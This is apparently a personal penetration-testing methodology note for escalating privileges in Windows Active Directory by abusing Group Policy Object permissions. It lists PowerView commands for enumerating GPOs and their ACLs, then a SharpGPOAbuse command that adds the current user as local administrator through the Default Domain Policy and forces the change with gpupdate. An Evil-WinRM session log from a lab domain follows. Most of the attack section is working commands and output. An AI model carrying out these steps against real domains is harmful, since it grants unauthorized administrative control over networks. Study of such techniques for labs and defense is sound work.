
It is under binaries in my kali
*SharpGPOAbuse.exe*

https://medium.com/@raphaeltzy13/group-policy-object-gpo-abuse-windows-active-directory-privilege-escalation-51d8519a13d7


[[masterDoc/myMethodology/Exploitation/Escalation/Active Directory/PowerView]]

Enumerating for GPO rights

We can use Powerview to perform our enumeration to find possible GPO we have rights over

https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

Run this to list all GPOs:

```
Get-NetGPO | select displayname
```

Lets say we wish to enumerate the “Default Domain Policy” GPO listed, execute the following and take note of the Id:

```
Get-GPO -Name "Default Domain Policy
```

![[Pasted image 20241029222513.png]]

Now we shall check for the permissions our current user have over the Default Domain Policy GPO
```
Get-GPPermission -Guid 31b2f340-016d-11d2-945f-00c04fb984f9 -TargetType User -TargetName <user>
```

The following output would indicate that we have several useful permissions, which we could leverage to take control of the GPO

![[Pasted image 20241029222652.png]]
### Abusing GPO to add a new local admin

Now lets move on to the exciting part! Git clone SharpGPOAbuse to get started

Now execute the following to add our current user to the local admin group.

The GPOName flag will simply be the GPO which we have rights over which you should have enumerated out in the previous section, in our case, Default Domain Policy. UserAccount should be our current user that we are logged in with.

```
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName "Default Domain Policy"
```

![[Pasted image 20241029222716.png]]
Now the next step here is quite important, we will have to run this in order to force update the policy new settings so our changes can take effect

After that, simple run net localgroup administrators and we should see our current user now part of the administrators group!

```
gpupdate /force
```

![[Pasted image 20241029222733.png]]

## EXAMPLE secura

```
*Evil-WinRM* PS C:\Users\TEMP\Documents> Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\Users\TEMP\Documents> Get-NetDomain


Forest                  : secura.yzx
DomainControllers       : {dc01.secura.yzx}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : dc01.secura.yzx
RidRoleOwner            : dc01.secura.yzx
InfrastructureRoleOwner : dc01.secura.yzx
Name                    : secura.yzx



*Evil-WinRM* PS C:\Users\TEMP\Documents> Get-NetGPO | select displayname

displayname
-----------
Default Domain Policy
Default Domain Controllers Policy
```

```
*Evil-WinRM* PS C:\Users\TEMP\Documents> Get-GPO -Name "Default Domain Policy" 


DisplayName      : Default Domain Policy
DomainName       : secura.yzx
Owner            : SECURA\Domain Admins
Id               : 31b2f340-016d-11d2-945f-00c04fb984f9
GpoStatus        : AllSettingsEnabled
Description      :
CreationTime     : 8/5/2022 6:20:58 PM
ModificationTime : 10/25/2022 5:39:34 PM
UserVersion      : AD Version: 3, SysVol Version: 3
ComputerVersion  : AD Version: 70, SysVol Version: 70
WmiFilter        :
```


## Determine if user has gpo permission
https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview#group-policy-object-gpos

```
Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=secure,DC=yzx" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
```
